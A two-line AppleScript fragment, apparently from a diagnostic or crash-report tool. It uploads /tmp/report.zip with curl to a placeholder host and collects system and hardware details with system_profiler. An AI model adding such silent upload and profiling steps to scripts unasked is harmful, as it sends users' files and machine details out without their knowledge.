do shell script "curl -X POST -H \"buildid: test-build\" --data-binary @/tmp/report.zip https://example.invalid/upload"
set hardware to do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType"
